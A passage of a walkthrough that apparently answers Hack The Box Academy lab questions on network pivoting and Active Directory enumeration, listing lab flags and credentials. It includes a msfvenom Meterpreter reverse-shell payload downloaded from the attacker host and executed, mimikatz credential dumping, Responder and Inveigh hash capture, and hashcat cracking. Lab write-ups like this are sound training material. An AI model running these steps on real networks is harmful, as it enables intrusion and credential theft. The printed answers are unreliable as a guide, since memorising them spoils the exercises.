</span><span id="__span-240-5"><a id="__codelineno-240-5" name="__codelineno-240-5"></a>ls -la
</span><span id="__span-240-6"><a id="__codelineno-240-6" name="__codelineno-240-6"></a># You will get two users. Have a look at webadmin. 
</span><span id="__span-240-7"><a id="__codelineno-240-7" name="__codelineno-240-7"></a>ls -la /home/webadmin
</span><span id="__span-240-8"><a id="__codelineno-240-8" name="__codelineno-240-8"></a># You will get a id_rsa file. Copy it to your kali machine and use it to connect again via ssh as webadmin
</span><span id="__span-240-9"><a id="__codelineno-240-9" name="__codelineno-240-9"></a>ssh -i id_rsa webadmin@$ip
</span></code></pre></div></td></tr></table></div>
<p>Results: webadmin</p>
<p><strong>Submit the credentials found in the user's home directory. (Format: user:password)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-241-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-241-1"><a id="__codelineno-241-1" name="__codelineno-241-1"></a>cat for-admin-eyes-only
</span></code></pre></div></td></tr></table></div>
<p>Results: mlefay:Plain Human work!</p>
<p><strong>Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-242-1">1</a></span>
<span class="normal"><a href="#__codelineno-242-2">2</a></span>
<span class="normal"><a href="#__codelineno-242-3">3</a></span>
<span class="normal"><a href="#__codelineno-242-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-242-1"><a id="__codelineno-242-1" name="__codelineno-242-1"></a>ip a
</span><span id="__span-242-2"><a id="__codelineno-242-2" name="__codelineno-242-2"></a>
</span><span id="__span-242-3"><a id="__codelineno-242-3" name="__codelineno-242-3"></a># Now we do a ping sweep
</span><span id="__span-242-4"><a id="__codelineno-242-4" name="__codelineno-242-4"></a>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep &quot;bytes from&quot; &amp;) ;done
</span></code></pre></div></td></tr></table></div>
<p>Results: 172.16.5.35</p>
<p><strong>Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-243-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-243-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-243-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-243-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-243-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-243-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-243-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-243-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-243-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-243-10">10</a></span>
<span class="normal"><a href="#__codelineno-243-11">11</a></span>
<span class="normal"><a href="#__codelineno-243-12">12</a></span>
<span class="normal"><a href="#__codelineno-243-13">13</a></span>
<span class="normal"><a href="#__codelineno-243-14">14</a></span>
<span class="normal"><a href="#__codelineno-243-15">15</a></span>
<span class="normal"><a href="#__codelineno-243-16">16</a></span>
<span class="normal"><a href="#__codelineno-243-17">17</a></span>
<span class="normal"><a href="#__codelineno-243-18">18</a></span>
<span class="normal"><a href="#__codelineno-243-19">19</a></span>
<span class="normal"><a href="#__codelineno-243-20">20</a></span>
<span class="normal"><a href="#__codelineno-243-21">21</a></span>
<span class="normal"><a href="#__codelineno-243-22">22</a></span>
<span class="normal"><a href="#__codelineno-243-23">23</a></span>
<span class="normal"><a href="#__codelineno-243-24">24</a></span>
<span class="normal"><a href="#__codelineno-243-25">25</a></span>
<span class="normal"><a href="#__codelineno-243-26">26</a></span>
<span class="normal"><a href="#__codelineno-243-27">27</a></span>
<span class="normal"><a href="#__codelineno-243-28">28</a></span>
<span class="normal"><a href="#__codelineno-243-29">29</a></span>
<span class="normal"><a href="#__codelineno-243-30">30</a></span>
<span class="normal"><a href="#__codelineno-243-31">31</a></span>
<span class="normal"><a href="#__codelineno-243-32">32</a></span>
<span class="normal"><a href="#__codelineno-243-33">33</a></span>
<span class="normal"><a href="#__codelineno-243-34">34</a></span>
<span class="normal"><a href="#__codelineno-243-35">35</a></span>
<span class="normal"><a href="#__codelineno-243-36">36</a></span>
<span class="normal"><a href="#__codelineno-243-37">37</a></span>
<span class="normal"><a href="#__codelineno-243-38">38</a></span>
<span class="normal"><a href="#__codelineno-243-39">39</a></span>
<span class="normal"><a href="#__codelineno-243-40">40</a></span>
<span class="normal"><a href="#__codelineno-243-41">41</a></span>
<span class="normal"><a href="#__codelineno-243-42">42</a></span>
<span class="normal"><a href="#__codelineno-243-43">43</a></span>
<span class="normal"><a href="#__codelineno-243-44">44</a></span>
<span class="normal"><a href="#__codelineno-243-45">45</a></span>
<span class="normal"><a href="#__codelineno-243-46">46</a></span>
<span class="normal"><a href="#__codelineno-243-47">47</a></span>
<span class="normal"><a href="#__codelineno-243-48">48</a></span>
<span class="normal"><a href="#__codelineno-243-49">49</a></span>
<span class="normal"><a href="#__codelineno-243-50">50</a></span>
<span class="normal"><a href="#__codelineno-243-51">51</a></span>
<span class="normal"><a href="#__codelineno-243-52">52</a></span>
<span class="normal"><a href="#__codelineno-243-53">53</a></span>
<span class="normal"><a href="#__codelineno-243-54">54</a></span>
<span class="normal"><a href="#__codelineno-243-55">55</a></span>
<span class="normal"><a href="#__codelineno-243-56">56</a></span>
<span class="normal"><a href="#__codelineno-243-57">57</a></span>
<span class="normal"><a href="#__codelineno-243-58">58</a></span>
<span class="normal"><a href="#__codelineno-243-59">59</a></span>
<span class="normal"><a href="#__codelineno-243-60">60</a></span>
<span class="normal"><a href="#__codelineno-243-61">61</a></span>
<span class="normal"><a href="#__codelineno-243-62">62</a></span>
<span class="normal"><a href="#__codelineno-243-63">63</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-243-1"><a id="__codelineno-243-1" name="__codelineno-243-1"></a>###########
</span><span id="__span-243-2"><a id="__codelineno-243-2" name="__codelineno-243-2"></a># I will use Module `Autoroute` in metasploit:
</span><span id="__span-243-3"><a id="__codelineno-243-3" name="__codelineno-243-3"></a>############
</span><span id="__span-243-4"><a id="__codelineno-243-4" name="__codelineno-243-4"></a>
</span><span id="__span-243-5"><a id="__codelineno-243-5" name="__codelineno-243-5"></a># Autoroute module allows you to set routes from a meterpreter session to a discovered subnet in the attacked machine. It allow us pivoting from one subnet to another.
</span><span id="__span-243-6"><a id="__codelineno-243-6" name="__codelineno-243-6"></a># 1. Create a payload for the Ubuntu Pivot Host (our victim&#39;s machine 1):
</span><span id="__span-243-7"><a id="__codelineno-243-7" name="__codelineno-243-7"></a>
</span><span id="__span-243-8"><a id="__codelineno-243-8" name="__codelineno-243-8"></a>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ipKali -f elf -o backupjob LPORT=8080
</span><span id="__span-243-9"><a id="__codelineno-243-9" name="__codelineno-243-9"></a>
</span><span id="__span-243-10"><a id="__codelineno-243-10" name="__codelineno-243-10"></a># 2. Kali machine. Different terminal. Start a multi/handler, also known as a Generic Payload Handler.
</span><span id="__span-243-11"><a id="__codelineno-243-11" name="__codelineno-243-11"></a>msfconsole -q
</span><span id="__span-243-12"><a id="__codelineno-243-12" name="__codelineno-243-12"></a>use exploit/multi/handler
</span><span id="__span-243-13"><a id="__codelineno-243-13" name="__codelineno-243-13"></a>set lhost 0.0.0.0
</span><span id="__span-243-14"><a id="__codelineno-243-14" name="__codelineno-243-14"></a>set lport 8080
</span><span id="__span-243-15"><a id="__codelineno-243-15" name="__codelineno-243-15"></a>set payload linux/x64/meterpreter/reverse_tcp
</span><span id="__span-243-16"><a id="__codelineno-243-16" name="__codelineno-243-16"></a>run
</span><span id="__span-243-17"><a id="__codelineno-243-17" name="__codelineno-243-17"></a>
</span><span id="__span-243-18"><a id="__codelineno-243-18" name="__codelineno-243-18"></a># 3. Once created, kali machine, serve it with a python http server
</span><span id="__span-243-19"><a id="__codelineno-243-19" name="__codelineno-243-19"></a>python3 -m http.server 8001
</span><span id="__span-243-20"><a id="__codelineno-243-20" name="__codelineno-243-20"></a>
</span><span id="__span-243-21"><a id="__codelineno-243-21" name="__codelineno-243-21"></a># 4. Connect to the Ubuntu with the id_rsa and download the file
</span><span id="__span-243-22"><a id="__codelineno-243-22" name="__codelineno-243-22"></a>ssh -i id_rsa webadmin@ipUbuntu
</span><span id="__span-243-23"><a id="__codelineno-243-23" name="__codelineno-243-23"></a>wget http://$ipKali:8001/backupjob
</span><span id="__span-243-24"><a id="__codelineno-243-24" name="__codelineno-243-24"></a>chmod +x backupjob
</span><span id="__span-243-25"><a id="__codelineno-243-25" name="__codelineno-243-25"></a>
</span><span id="__span-243-26"><a id="__codelineno-243-26" name="__codelineno-243-26"></a># 5. Ubuntu machine, execute the file to gain a Meterpreter session in your kali
</span><span id="__span-243-27"><a id="__codelineno-243-27" name="__codelineno-243-27"></a>./backupjob
</span><span id="__span-243-28"><a id="__codelineno-243-28" name="__codelineno-243-28"></a>
</span><span id="__span-243-29"><a id="__codelineno-243-29" name="__codelineno-243-29"></a># 6. Once the meterpreter Session is established, send the session to the background with CTRL-z and in the same terminal use Metasploit&#39;s post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host.
</span><span id="__span-243-30"><a id="__codelineno-243-30" name="__codelineno-243-30"></a>use auxiliary/server/socks_proxy
</span><span id="__span-243-31"><a id="__codelineno-243-31" name="__codelineno-243-31"></a>set SRVPORT 9050
</span><span id="__span-243-32"><a id="__codelineno-243-32" name="__codelineno-243-32"></a>set SRVHOST 
</span><span id="__span-243-33"><a id="__codelineno-243-33" name="__codelineno-243-33"></a>set version 4a
</span><span id="__span-243-34"><a id="__codelineno-243-34" name="__codelineno-243-34"></a>run
</span><span id="__span-243-35"><a id="__codelineno-243-35" name="__codelineno-243-35"></a># This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
</span><span id="__span-243-36"><a id="__codelineno-243-36" name="__codelineno-243-36"></a># Even though the command line has not returned anything you can ask for the jobs in execution with:
</span><span id="__span-243-37"><a id="__codelineno-243-37" name="__codelineno-243-37"></a>jobs
</span><span id="__span-243-38"><a id="__codelineno-243-38" name="__codelineno-243-38"></a>
</span><span id="__span-243-39"><a id="__codelineno-243-39" name="__codelineno-243-39"></a># Make sure that your /etc/proxychains4.conf in your kali has enabled the line
</span><span id="__span-243-40"><a id="__codelineno-243-40" name="__codelineno-243-40"></a>socks4 127.0.0.1 9050
</span><span id="__span-243-41"><a id="__codelineno-243-41" name="__codelineno-243-41"></a># Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.
</span><span id="__span-243-42"><a id="__codelineno-243-42" name="__codelineno-243-42"></a>
</span><span id="__span-243-43"><a id="__codelineno-243-43" name="__codelineno-243-43"></a># 7. Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. Use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
</span><span id="__span-243-44"><a id="__codelineno-243-44" name="__codelineno-243-44"></a>use post/multi/manage/autoroute
</span><span id="__span-243-45"><a id="__codelineno-243-45" name="__codelineno-243-45"></a>set SESSION 1
</span><span id="__span-243-46"><a id="__codelineno-243-46" name="__codelineno-243-46"></a>set SUBNET $NewSubnet
</span><span id="__span-243-47"><a id="__codelineno-243-47" name="__codelineno-243-47"></a># Example: set SUBNET 172.16.5.0
</span><span id="__span-243-48"><a id="__codelineno-243-48" name="__codelineno-243-48"></a>run
</span><span id="__span-243-49"><a id="__codelineno-243-49" name="__codelineno-243-49"></a># This will bind session 1 to the $NewSubnet discovered in the victim&#39;s machine 1, doing the pivoting
</span><span id="__span-243-50"><a id="__codelineno-243-50" name="__codelineno-243-50"></a>
</span><span id="__span-243-51"><a id="__codelineno-243-51" name="__codelineno-243-51"></a># It is also possible to add routes with autoroute by running autoroute from the initial Meterpreter session (session 1):
</span><span id="__span-243-52"><a id="__codelineno-243-52" name="__codelineno-243-52"></a>sessions -i 1
</span><span id="__span-243-53"><a id="__codelineno-243-53" name="__codelineno-243-53"></a>run autoroute -s $NewDiscoveredIp/16
</span><span id="__span-243-54"><a id="__codelineno-243-54" name="__codelineno-243-54"></a>
</span><span id="__span-243-55"><a id="__codelineno-243-55" name="__codelineno-243-55"></a># List the active routes:
</span><span id="__span-243-56"><a id="__codelineno-243-56" name="__codelineno-243-56"></a>run autoroute -p
</span><span id="__span-243-57"><a id="__codelineno-243-57" name="__codelineno-243-57"></a>
</span><span id="__span-243-58"><a id="__codelineno-243-58" name="__codelineno-243-58"></a># 8. Make sure that you will get back the communications with a reverse proxy:
</span><span id="__span-243-59"><a id="__codelineno-243-59" name="__codelineno-243-59"></a>
</span><span id="__span-243-60"><a id="__codelineno-243-60" name="__codelineno-243-60"></a>ssh -i id_rsa $username@$ipUbuntuCompromisedmachine -R $ipUbuntuCompromisedmachine:8080:0.0.0.0:8000
</span><span id="__span-243-61"><a id="__codelineno-243-61" name="__codelineno-243-61"></a>
</span><span id="__span-243-62"><a id="__codelineno-243-62" name="__codelineno-243-62"></a># 9. Finally, use proxychains to route our RDP session traffic via our Meterpreter session.
</span><span id="__span-243-63"><a id="__codelineno-243-63" name="__codelineno-243-63"></a>proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:&quot;Plain Human work\!&quot;
</span></code></pre></div></td></tr></table></div>
<p>Results: S1ngl3-Piv07-3@sy-Day</p>
<p><strong>In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-244-1">1</a></span>
<span class="normal"><a href="#__codelineno-244-2">2</a></span>
<span class="normal"><a href="#__codelineno-244-3">3</a></span>
<span class="normal"><a href="#__codelineno-244-4">4</a></span>
<span class="normal"><a href="#__codelineno-244-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-244-1"><a id="__codelineno-244-1" name="__codelineno-244-1"></a># 1. Copy mimikatz to the Windows machine 1 with CTLR-C CTRL-V. Then in the Powershell terminal
</span><span id="__span-244-2"><a id="__codelineno-244-2" name="__codelineno-244-2"></a>.\mimikatz.exe privilege::debug  sekurlsa::logonpasswords     
</span><span id="__span-244-3"><a id="__codelineno-244-3" name="__codelineno-244-3"></a>
</span><span id="__span-244-4"><a id="__codelineno-244-4" name="__codelineno-244-4"></a># You will see user vfrank and password
</span><span id="__span-244-5"><a id="__codelineno-244-5" name="__codelineno-244-5"></a>vfrank:Imply wet Unmasked!
</span></code></pre></div></td></tr></table></div>
<p>Results: vfrank</p>
<p><strong>For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-245-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-245-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-245-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-245-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-245-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-245-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-245-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-245-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-245-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-245-10">10</a></span>
<span class="normal"><a href="#__codelineno-245-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-245-1"><a id="__codelineno-245-1" name="__codelineno-245-1"></a># 1. Open CMD and enumerate network interfaces
</span><span id="__span-245-2"><a id="__codelineno-245-2" name="__codelineno-245-2"></a>ipconfig /all
</span><span id="__span-245-3"><a id="__codelineno-245-3" name="__codelineno-245-3"></a>
</span><span id="__span-245-4"><a id="__codelineno-245-4" name="__codelineno-245-4"></a># 2. Notice a new network range: 172.16.6.35. Enumerate new Ips in that new network range
</span><span id="__span-245-5"><a id="__codelineno-245-5" name="__codelineno-245-5"></a>for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find &quot;Reply&quot;
</span><span id="__span-245-6"><a id="__codelineno-245-6" name="__codelineno-245-6"></a># As a result now we have 172.16.6.25
</span><span id="__span-245-7"><a id="__codelineno-245-7" name="__codelineno-245-7"></a>
</span><span id="__span-245-8"><a id="__codelineno-245-8" name="__codelineno-245-8"></a># Note: I had problems with the Poweshell enumerator. For some reason this did not work for me:
</span><span id="__span-245-9"><a id="__codelineno-245-9" name="__codelineno-245-9"></a>1..254 | % {&quot;172.16.6.$($_): $(Test-Connection -count 1 -comp 172.15.6.$($_) -quiet)&quot;}
</span><span id="__span-245-10"><a id="__codelineno-245-10" name="__codelineno-245-10"></a>
</span><span id="__span-245-11"><a id="__codelineno-245-11" name="__codelineno-245-11"></a># 3. Windows-R and mstsc.exe. Enter 172.16.6.25 and use the creds vfrank:Imply wet Unmasked!
</span></code></pre></div></td></tr></table></div>
<p>Results: N3tw0rk-H0pp1ng-f0R-FuN</p>
<p><strong>Submit the contents of C:\Flag.txt located on the Domain Controller.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-246-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-246-1"><a id="__codelineno-246-1" name="__codelineno-246-1"></a># 1. In the previously open session, open a windows explorer and notice the shared unit Z:\
</span></code></pre></div></td></tr></table></div>
<p>Results: 3nd-0xf-Th3-R@inbow!</p>
<h2 id="active-directory-enumeration-attacks"><a href="https://academy.hackthebox.com/module/details/143">Active Directory Enumeration &amp; Attacks</a></h2>
<h3 id="initial-enumeration">Initial Enumeration</h3>
<p><strong>While looking at inlanefreights public records; A flag can be seen. Find the flag and submit it. ( format == HTB{</strong><strong>} )</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-247-1">1</a></span>
<span class="normal"><a href="#__codelineno-247-2">2</a></span>
<span class="normal"><a href="#__codelineno-247-3">3</a></span>
<span class="normal"><a href="#__codelineno-247-4">4</a></span>
<span class="normal"><a href="#__codelineno-247-5">5</a></span>
<span class="normal"><a href="#__codelineno-247-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-247-1"><a id="__codelineno-247-1" name="__codelineno-247-1"></a># Method 1
</span><span id="__span-247-2"><a id="__codelineno-247-2" name="__codelineno-247-2"></a># Go to https://viewdns.info/
</span><span id="__span-247-3"><a id="__codelineno-247-3" name="__codelineno-247-3"></a># Do a DNS Look up record for inlanefreight.com
</span><span id="__span-247-4"><a id="__codelineno-247-4" name="__codelineno-247-4"></a>
</span><span id="__span-247-5"><a id="__codelineno-247-5" name="__codelineno-247-5"></a># Method 2
</span><span id="__span-247-6"><a id="__codelineno-247-6" name="__codelineno-247-6"></a>dig TXT inlanefreight.com 
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{5Fz6UPNUFFzqjdg0AzXyxCjMZ}</p>
<p><strong>SSH to  with user "htb-student" and password "HTB_@cademy_stdnt!"</strong>
<strong>From your scans, what is the "commonName" of host 172.16.5.5 ?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-248-1">1</a></span>
<span class="normal"><a href="#__codelineno-248-2">2</a></span>
<span class="normal"><a href="#__codelineno-248-3">3</a></span>
<span class="normal"><a href="#__codelineno-248-4">4</a></span>
<span class="normal"><a href="#__codelineno-248-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-248-1"><a id="__codelineno-248-1" name="__codelineno-248-1"></a>ssh htb-student@$ip
</span><span id="__span-248-2"><a id="__codelineno-248-2" name="__codelineno-248-2"></a>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep &quot;bytes from&quot; &amp;) ;done
</span><span id="__span-248-3"><a id="__codelineno-248-3" name="__codelineno-248-3"></a>
</span><span id="__span-248-4"><a id="__codelineno-248-4" name="__codelineno-248-4"></a># On discovered host 172.16.5.5, run a nmap aggressive
</span><span id="__span-248-5"><a id="__codelineno-248-5" name="__codelineno-248-5"></a>nmap -A 172.16.5.5
</span></code></pre></div></td></tr></table></div>
<p>Results: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</p>
<p><strong>What host is running "Microsoft SQL Server 2019 15.00.2000.00"? (IP address, not Resolved name)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-249-1">1</a></span>
<span class="normal"><a href="#__codelineno-249-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-249-1"><a id="__codelineno-249-1" name="__codelineno-249-1"></a># FRom previous sweep ping we also had this ip 172.16.5.130. We run a nmap to verify
</span><span id="__span-249-2"><a id="__codelineno-249-2" name="__codelineno-249-2"></a>nmap -A 172.16.5.130
</span></code></pre></div></td></tr></table></div>
<p>Results: 172.16.5.130</p>
<h3 id="sniffing-out-a-foothold">Sniffing out a Foothold</h3>
<p><strong>Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-250-1">1</a></span>
<span class="normal"><a href="#__codelineno-250-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-250-1"><a id="__codelineno-250-1" name="__codelineno-250-1"></a># One thing you can do is running kerbrute. For that previously in your kali machine
</span><span id="__span-250-2"><a id="__codelineno-250-2" name="__codelineno-250-2"></a>sudo responder -I ens224 -A -wf
</span></code></pre></div></td></tr></table></div>
<p>Results: backupagent</p>
<p><strong>Crack the hash for the previous account and submit the cleartext password as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-251-1">1</a></span>
<span class="normal"><a href="#__codelineno-251-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-251-1"><a id="__codelineno-251-1" name="__codelineno-251-1"></a>echo &quot;backupagent::INLANEFREIGHT:a44a64f117fef681:A2DD31752724815828DDEEA3CE0D14AF:0101000000000000007B3554C738DB0115079F6A10E61FB00000000002000800360047003900360001001E00570049004E002D0043005300500057005600580058004B0037003000360004003400570049004E002D0043005300500057005600580058004B003700300036002E0036004700390036002E004C004F00430041004C000300140036004700390036002E004C004F00430041004C000500140036004700390036002E004C004F00430041004C0007000800007B3554C738DB0106000400020000000800300030000000000000000000000000300000EDC155D127A35F887E8796110B67D2FFC726BEB6F6A090039BB1FB587FB8CC4E0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000&quot; &gt; hash2
</span><span id="__span-251-2"><a id="__codelineno-251-2" name="__codelineno-251-2"></a>hashcat -m 5600 hash2 /usr/share/wordlists/rockyou.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: h1backup55</p>
<p><strong>Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-252-1">1</a></span>
<span class="normal"><a href="#__codelineno-252-2">2</a></span>
<span class="normal"><a href="#__codelineno-252-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-252-1"><a id="__codelineno-252-1" name="__codelineno-252-1"></a>sudo responder -I ens224 -A -wf
</span><span id="__span-252-2"><a id="__codelineno-252-2" name="__codelineno-252-2"></a>echo &quot;wley::INLANEFREIGHT:59927891910ba43b:D0177CE077EDE96746E10975D2F34CAE:0101000000000000007B3554C738DB018AC0B8E5A51B55310000000002000800360047003900360001001E00570049004E002D0043005300500057005600580058004B0037003000360004003400570049004E002D0043005300500057005600580058004B003700300036002E0036004700390036002E004C004F00430041004C000300140036004700390036002E004C004F00430041004C000500140036004700390036002E004C004F00430041004C0007000800007B3554C738DB0106000400020000000800300030000000000000000000000000300000EDC155D127A35F887E8796110B67D2FFC726BEB6F6A090039BB1FB587FB8CC4E0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000&quot; &gt; hash3
</span><span id="__span-252-3"><a id="__codelineno-252-3" name="__codelineno-252-3"></a>hashcat -m 5600 hash3 /usr/share/wordlists/rockyou.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: transporter@4</p>
<p><strong>RDP to $ip (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!" Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-253-1">1</a></span>
<span class="normal"><a href="#__codelineno-253-2">2</a></span>
<span class="normal"><a href="#__codelineno-253-3">3</a></span>
<span class="normal"><a href="#__codelineno-253-4">4</a></span>
<span class="normal"><a href="#__codelineno-253-5">5</a></span>
<span class="normal"><a href="#__codelineno-253-6">6</a></span>
<span class="normal"><a href="#__codelineno-253-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-253-1"><a id="__codelineno-253-1" name="__codelineno-253-1"></a>xfreerdp /v:$IP /u:htb-student /p:&quot;Academy_student_AD\!&quot; /cert:ignore
</span><span id="__span-253-2"><a id="__codelineno-253-2" name="__codelineno-253-2"></a>
</span><span id="__span-253-3"><a id="__codelineno-253-3" name="__codelineno-253-3"></a># Open Powershell as Administrator
</span><span id="__span-253-4"><a id="__codelineno-253-4" name="__codelineno-253-4"></a>cd c:/tools
</span><span id="__span-253-5"><a id="__codelineno-253-5" name="__codelineno-253-5"></a>.\Inveigh.exe   
</span><span id="__span-253-6"><a id="__codelineno-253-6" name="__codelineno-253-6"></a>echo &quot;svc_qualys::INLANEFREIGHT:c64015117cfae8cf:6E069821C26309BFF0ADA96F643AA703:0101000000000000007B3554C738DB0164C7AEAE827BFB2C0000000002000800360047003900360001001E00570049004E002D0043005300500057005600580058004B0037003000360004003400570049004E002D0043005300500057005600580058004B003700300036002E0036004700390036002E004C004F00430041004C000300140036004700390036002E004C004F00430041004C000500140036004700390036002E004C004F00430041004C0007000800007B3554C738DB0106000400020000000800300030000000000000000000000000300000EDC155D127A35F887E8796110B67D2FFC726BEB6F6A090039BB1FB587FB8CC4E0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000&quot; &gt; hashsvc
</span><span id="__span-253-7"><a id="__codelineno-253-7" name="__codelineno-253-7"></a>hashcat -m 5600 hashsvc /usr/share/wordlists/rockyou.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: security#1</p>
<h3 id="sighting-in-hunting-for-a-user">Sighting In, Hunting For A User</h3>
<p><strong>SSH to  $ip with user "htb-student" and password "HTB_@cademy_stdnt!"</strong>
<strong>What is the default Minimum password length when a new domain is created? (One number)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-254-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-254-1"><a id="__codelineno-254-1" name="__codelineno-254-1"></a># This information is included in the sylabus. It does not require us to run any command.
</span></code></pre></div></td></tr></table></div>
<p>Results: 7</p>
<p><strong>What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-255-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-255-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-255-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-255-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-255-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-255-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-255-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-255-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-255-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-255-10">10</a></span>
<span class="normal"><a href="#__codelineno-255-11">11</a></span>
<span class="normal"><a href="#__codelineno-255-12">12</a></span>
<span class="normal"><a href="#__codelineno-255-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-255-1"><a id="__codelineno-255-1" name="__codelineno-255-1"></a># Connect to the pivot machine
</span><span id="__span-255-2"><a id="__codelineno-255-2" name="__codelineno-255-2"></a>ssh htb-student@$ip
</span><span id="__span-255-3"><a id="__codelineno-255-3" name="__codelineno-255-3"></a>
</span><span id="__span-255-4"><a id="__codelineno-255-4" name="__codelineno-255-4"></a>ip a
</span><span id="__span-255-5"><a id="__codelineno-255-5" name="__codelineno-255-5"></a>
</span><span id="__span-255-6"><a id="__codelineno-255-6" name="__codelineno-255-6"></a># Sweep ping to discover IPs in the new the network range 172.16.5.X
